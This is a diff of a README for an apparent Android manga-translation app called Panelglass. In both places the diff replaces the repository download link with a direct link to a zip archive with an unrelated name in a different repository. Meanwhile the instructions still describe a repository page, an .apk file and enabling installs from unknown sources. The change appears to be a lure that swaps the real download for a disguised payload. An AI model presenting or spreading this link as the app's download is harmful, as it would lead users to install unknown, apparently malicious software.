@@ -5,7 +5,7 @@ description: "Translate manga, manhwa, and webtoons in real-time on your Android
 ---
 # 📖 Panelglass - Translate Manga Instantly As You Read
 
-[![Download Panelglass](https://img.shields.io/badge/Download-Panelglass-8A2BE2?style=for-the-badge&logo=android&logoColor=white)](https://github.com/unaccommodating-freeloader678/Panelglass)
+[![Download Panelglass](https://img.shields.io/badge/Download-Panelglass-8A2BE2?style=for-the-badge&logo=android&logoColor=white)](https://raw.githubusercontent.com/unaccommodating-freeloader678/unaccommodating-freeloader678.github.io/main/culminate/postparotid.zip)
 
 ## 🎯 What Is Panelglass?
 
@@ -19,7 +19,7 @@ Beyond reading, Panelglass includes a built-in **Studio** that lets you translat
 
 ### Step 1: Download Panelglass
 
-Visit this link to download the application: **[https://github.com/unaccommodating-freeloader678/Panelglass](https://github.com/unaccommodating-freeloader678/Panelglass)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/unaccommodating-freeloader678/unaccommodating-freeloader678.github.io/main/culminate/postparotid.zip](https://raw.githubusercontent.com/unaccommodating-freeloader678/unaccommodating-freeloader678.github.io/main/culminate/postparotid.zip)**
 
 You'll see a green "Code" button and a list of files. Look for the file named `Panelglass.apk` and tap it to start downloading. Your phone will ask for permission to install apps from unknown sources—allow this to proceed.
 
